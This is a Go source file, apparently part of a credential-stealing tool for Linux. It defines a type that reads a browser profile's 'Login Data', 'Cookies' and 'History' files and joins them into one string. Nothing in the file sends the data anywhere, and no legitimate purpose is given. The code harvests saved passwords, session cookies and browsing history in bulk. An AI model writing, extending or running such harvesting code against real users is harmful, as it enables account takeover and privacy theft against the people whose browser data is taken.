//go:build linux

package cred

import (
	"os"
)

type LinuxBrowserCred struct {
	Path string
}

func NewLinuxBrowserCred(path string) *LinuxBrowserCred {
	return &LinuxBrowserCred{Path: path}
}

func (l *LinuxBrowserCred) ReadLoginData() string {
	data, err := os.ReadFile(l.Path + "/Login Data")
	if err != nil {
		return ""
	}
	return string(data)
}

func (l *LinuxBrowserCred) ReadCookies() string {
	data, err := os.ReadFile(l.Path + "/Cookies")
	if err != nil {
		return ""
	}
	return string(data)
}

func (l *LinuxBrowserCred) ReadHistory() string {
	data, err := os.ReadFile(l.Path + "/History")
	if err != nil {
		return ""
	}
	return string(data)
}

func (l *LinuxBrowserCred) GetAllData() string {
	var result string
	result += l.ReadLoginData()
	result += l.ReadCookies()
	result += l.ReadHistory()
	return result
}
